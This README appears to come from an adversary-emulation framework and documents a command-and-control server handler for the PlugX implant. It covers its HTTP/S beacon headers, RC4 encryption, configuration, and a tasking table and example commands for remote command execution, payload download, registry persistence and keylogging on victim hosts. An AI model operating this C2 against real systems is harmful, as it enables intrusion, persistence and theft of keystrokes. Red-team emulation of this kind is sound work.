# PLUG X HTTP/S Handler

The Plug X HTTP/S Handler functions as the server-side counterpart to the Plug X implant, and communicates with it over HTTP/S. The handler is configured to do the following:

- respond to implant beacons
- register a new implant with the control server, or indicate that a session already exists for the implant
- process the data returned after the implant completes tasks
- accept tasking from `evalsC2client.py` and send the tasks to the implant when requested
- implant file download and command execution

## Components

The handler consists of an HTTP/S web server that listens on a specified address/port, and serves the following URL endpoints

| URL Endpoint | Server Response               | Description                              |
|--------------|-------------------------------|------------------------------------------|
| `GET /`      | Binary data (200 OK) response | Initial implant registration and beacons |

The Plug X implant and handler use two headers to correlate communication, `Sec-Site` and `Sec-Dest`.

- The `Sec-Dest` header is used as a unique implant identifier. (currently static)
- The `Sec-Site` header is used to transmit data from the implant to the C2 server. (command output, file uploads, etc.)

The `Sec-Site` header consists of the following data:

| Name          | Type   | Description                                                                                 |
|---------------|--------|---------------------------------------------------------------------------------------------|
| id            | int    | Instruction used to task a specific module in the implant, table with possible values below |
| argLength     | int    | Array length of args, set dynamically by the handler                                        |
| contentLength | int    | Total length of additional content attached to the packet                                   |
| args          | string | Command arguments that go with the tasking commands (Optional)                              |
| content       | string | Binary data that will be passed to modules                                                  |

## Encryption

All communication to/from the Plug X implant is RC4 encrypted with a hardcoded key.

## Usage

### Building

To build the control server binary, run the following command from the `evalsC2server` directory:

```shell
go build -o controlServer main.go
```

### Configuration

To enable and configure the Plug X HTTPS handler within the control server, provide a `plugx` entry in your handler configuration YAML file (see example below). Adjust the host and port values as necessary.

HTTP example:

```yaml
plugx:
  host: 10.0.2.11
  port: 8080
  https: false
  enabled: true
```

HTTPS example:

```yaml
plugx:
  host: 10.0.2.11
  port: 8080
  cert_file: "path/to/cert_file"
  key_file: "path/to/key_file"
  https: true
  enabled: true
```

Run the `controlServer` binary as `sudo` and monitor the output to see Plug X handler updates. Ex:

```bash
sudo ./controlServer -c ./config/your_handler_config.yml
```

## Testing

Unit tests for the Plug X HTTPS handler are available in the `plugx_test.go` file. To run these tests, run the following command from the `evalsC2server` directory:

```bash
sudo go test ./...
```

To run only a single test, navigate to the `evalsC2server/handlers/plugx` directory and run:

```bash
sudo go test -run NameOfTestFunction
```

### Tasking

The Plug X C2 Handler does not validate the tasking string before sending it to the implant, double check to ensure your task fields are labeled correctly. To submit a task to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields:

| Field | Data Type | Necessity | Description                                                                                            |
|-------|-----------|-----------|--------------------------------------------------------------------------------------------------------|
| id    | string    | required  | The ID of the task the implant will execute. A table detailing the different tasks is available below. |
| args  | string    | optional  | Any information the implant needs to complete the task. Ie. directory path or command line args        |
| file  | string    | optional  | Payload name on local host for file download                                                           |

The following table contains the various acceptable commands and their meanings:

| Command | Arguments              | Implant Output               | Description                                                                                    |
|---------|------------------------|------------------------------|------------------------------------------------------------------------------------------------|
| 0x1001  | Message box string     | None                         | Open a message box on the victim host                                                          |
| 0x9009  | None                   | C2 tasking string            | Implant echos the tasking sent by C2 server                                                    |
| 0x1003  | File name, file path   | None                         | File download                                                                                  |
| 0x1002  | None                   | None                         | Creates a run-key in the registry                                                              |
| 0x1100  | None                   | None                         | Opens a decoy PDF on the victim host with hardcoded path. Implant will run this automatically. |
| 0x1004  | None                   | None                         | Keylogger                                                                                      |
| 0x1000  | Command line arguments | Command output if applicable | Command execution                                                                              |
| 0xFFFF  | None                   | None                         | Terminate Plug X implant                                                                       |

Use the following format to submit the commands from the `evalsC2server` directory:

```shell
./evalsC2client.py --set-task <UUID> '{"id":"<id>", "args":"<args>", "file":"<file name>"}'
```

Example commands:

- "0x1000": Task command execution of `whoami`

  ```shell
  ./evalsC2client.py --set-task <UUID> '{"id": "0x1000", "args": "whoami"}'
  ```

- "0x1003": File download of `examplepayload.txt`

  ```shell
  ./evalsC2client.py --set-task <UUID> '{"id": "0x1003", "args":"C:\\Windows\\Temp\\examplepayload.txt", "file": "examplepayload.txt"}'
  ```

- "0x1004": Start the keylogger on the victim host

  ```shell
  ./evalsC2client.py --set-task <UUID> '{"id": "0x1004"}'
  ```

### Troubleshooting

To assist in troubleshooting, follow the directions [here](../../DebuggingGuide.md) to set up the Go Debugger.

**General Comms Troubleshooting:**

- Double check that the implant and the C2 are both communicating via HTTP or HTTPS
- If HTTPS is enabled, ensure that the implant and the handler are using the same certificates

**Tasking Troubleshooting:**

- The handler will not validate the tasking ID's sent by the operator, double check that your task string is in the correct format with the correct field names

## CTI References

1. [ElectricIQ.com](https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware)
2. [Checkpoint.com](https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/)
